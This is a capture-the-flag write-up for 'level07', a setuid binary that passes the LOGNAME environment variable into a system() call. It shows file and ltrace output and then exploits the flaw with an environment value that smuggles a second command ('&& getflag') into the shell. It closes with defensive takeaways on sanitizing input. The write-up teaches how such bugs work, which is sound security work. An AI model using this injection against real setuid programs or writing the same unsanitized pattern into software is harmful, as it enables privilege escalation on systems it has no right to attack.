# LEVEL07

## Analysis 

## Enumeration

In this challenge, we have to exploit a ELF 32-bit:
```bash
    $ file level07
```
Output:
```txt
    level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```

## Investigation

If we run this program, it just prints `level07`:
```bash
    $ ./level07 
    level07
```

We use ltrace to intercepts dynamic library calls:
```bash
    $ ltrace ./level07 
    [...]
    getenv("LOGNAME")                                                                 = "level07"
    asprintf(0xbffff734, 0x8048688, 0xbfffff44, 0xb7e5ee55, 0xb7fed280)               = 18
    system("/bin/echo level07 "level07
    [...]
```

## Exploitation

With `getenv` this program catches an environment variable `LOGNAME` with the value `level07` and insert it in a shell command `\bin\echo` with `system()`. `system` invokes a shell `/bin/sh -c` so if we ovverride (with `&&` for exemple) this environment variable we can force this program to launch another command.

```bash
    $ export LOGNAME+="&& getflag"
    $ ./level07 
    level07
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXx
```

## Takeaways

- Command injection through unsanitized environment variable usage.
- Passing unsanitized user-controlled data into system() leads to command injection and environment variables should never be trusted as safe input.
- `ltrace` is effective for identifying dangerous library calls in binaries.